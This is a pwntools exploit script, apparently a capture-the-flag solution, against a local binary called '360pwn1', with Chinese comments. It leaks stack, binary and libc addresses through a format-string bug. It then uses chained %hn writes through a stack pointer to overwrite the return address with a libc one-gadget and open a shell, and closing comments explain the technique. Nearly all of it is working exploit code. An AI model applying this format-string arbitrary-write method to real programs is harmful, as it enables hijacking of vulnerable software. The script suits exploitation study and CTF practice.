# -*- coding: utf-8 -*-
from pwn import *
p = process('./360pwn1')
gadgets = [0x3a80c, 0x3a80e, 0x3a812, 0x3a819, 0x5f065, 0x5f066]

def HL(value):
    lis = []
    high = value >> 16 #取高四位
    low = value & 0xffff #取低四位
    lis.append(low)   #先放入低四位
    lis.append(high)
    return lis

def input(payload):
    p.recvuntil("2. Exit")
    p.send('1')
    p.recvuntil("something")
    p.sendline(payload)

def exit():
    p.recvuntil("2. Exit")
    p.send('2')

## leak address
input("%5$p%12$p%15$p")
p.recvline()
leaked = p.recvline()
stack_addr = int(leaked[12:20], 16) #栈中的某处0xff9b7a70
bin_base = int(leaked[2:10], 16) - 0x1fb8 #程序基址0x5658bfb8  ->0x5658a000
var_addr = stack_addr - 0x2C + 0x3  #i的保存位置+0x3  ->0xff9b7a47
target_addr = stack_addr - 0x4   #栈中的位置，addr:0xff9b7a6c data:F7D80B41(返还地址)
libc_base = int(leaked[22:30], 16) - 247 - 0x18540 #libc基址
shell_addr = libc_base + gadgets[1]

log.info("binary_base address is %x" % bin_base)
log.info("libc_base address is %x" % libc_base)

# gdb.attach(p)
lis = HL(var_addr)
input("%" + str(lis[0]) + "c%21$hn") #修改变量i的值  21$,处->0xff9b7b04 —>0x58b0
input("%255d%57$hhn")  #ff9b7b04->(内修改过的)->%225d, 所以跳板为ff9b7b04

#返还地址共4字节，%n要填充太多字符。寻找一个跳板，分两步修改
lis = HL(target_addr)# ->0xff9b7a6c   0为后四位
input("%" + str(lis[0]) + "c%21$hn")  #
lis = HL(target_addr + 2)
input("%" + str(lis[0]) + "d%22$hn")  #addr:0x7a78->7b0c->0x85b8(将被修改，将变成指向ret+2)的指针
lis = HL(shell_addr)
input("%" + str(lis[0]) + "c%57$hn") #先写低四位，因为第四位保存在前面
input("%" + str(lis[1]) + "c%59$hn")  #addr ：0x7b0c->(指向的一个指针ret+2)->(将被修改为ogg的高4位)
exit()
p.interactive()

#使用格式化字符串修改数据：
#         0. %k$hn 不是修改第k个单元保存的数据
#         1.对于%k$hn，修改的是第k个单元保存的指针指向的地址开始的两个字节
#             如：k=21 这个单元addr：0xff9b7a74的数据是：0xff9b7b04，那么修改的就是0xff9b7b04和0xff9b7b05(这两个字节刚好是8位地址的4位)
#         2.引入跳板，上面的0xff9b7b04就是跳板，因为这个地址单元保存的数据上一步被修改，我们就可以通过上一步修改产生的指针去修改任意地址了
#             这次修改的地址就是k = 57 这个单元 addr：0xff9b7b04 data：0xff9bxxxx。(修改高四位地址，地址所在单元+2
#         3.，%c是输出字符。就用%xc填充 x为字符串类型的数据，填进去就是16进制  %d是输出十进制整数
